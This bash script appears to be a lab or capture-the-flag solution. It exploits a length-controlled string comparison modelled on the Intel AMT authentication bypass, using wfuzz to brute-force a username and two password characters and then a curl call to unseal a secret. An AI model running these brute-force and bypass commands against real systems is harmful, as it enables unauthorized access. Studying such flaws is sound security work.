#!/usr/bin/env bash

# The constant_strncmp function only compares the first n bytes
# Unfortunately, the length we pass into constant_strncmp is derived from user input
# From that, we can control the characters that are compared
# The original Intel AMT vulnerability was passing in an empty authentication digest

# First, we brute force the username
wfuzz -c --hh 143 -z permutation,abcdefghijklmnopqrstuvwxyz0123456789-3 --basic FUZZ: http://a.com/tpm/unseal/22c2ea9e-97b5-11e8-9eb6-529269fb1459

# You are supposed to realise that, for example by doing
# echo -n 'tpm:sadfasdf' | base64
# dHBtOnNhZGZhc2Rm
# echo -n 'tpm:' | base64
# dHBtOg==
# That even if you control the comparison length the comparison will fail.

# If the colon doesn't exist, authentication will fail.

# Because of this, we need to take base64 into account. Because base64 encodes in 3-byte blocks, even though
# we control the comparison length we still need to make at least 6 bytes match. This means we need to
# guess 2 characters of the password.

wfuzz -c --hc 403 -z permutation,abcdefghijklmnopqrstuvwxyz0123456789-2 --basic tpm:FUZZ http://a.com/tpm/unseal/22c2ea9e-97b5-11e8-9eb6-529269fb1459

curl -u tpm:r6 127.0.0.1:5000/tpm/unseal/22c2ea9e-97b5-11e8-9eb6-529269fb1459
